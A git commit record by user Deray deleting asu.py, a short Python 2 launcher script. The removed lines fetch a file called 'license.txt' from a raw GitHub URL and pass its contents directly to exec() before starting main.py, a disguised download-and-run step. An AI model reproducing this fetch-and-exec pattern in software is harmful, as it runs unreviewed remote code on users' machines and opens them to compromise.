30eb9384fdfac18adcd668c2a0bc011faed82f4c
Deray <33969267+LOoLzeC@users.noreply.github.com>
2019-05-06 20:01:01 +0000

    Delete asu.py

--- asu.py
+++
@@ -1,5 +0,0 @@
-import requests,os
-os.system("clear")
-exec(requests.get("https://raw.githubusercontent.com/LOoLzeC/ASU/master/raw/license.txt").text)
-raw_input("press enter ...")
-os.system("python2 main.py")
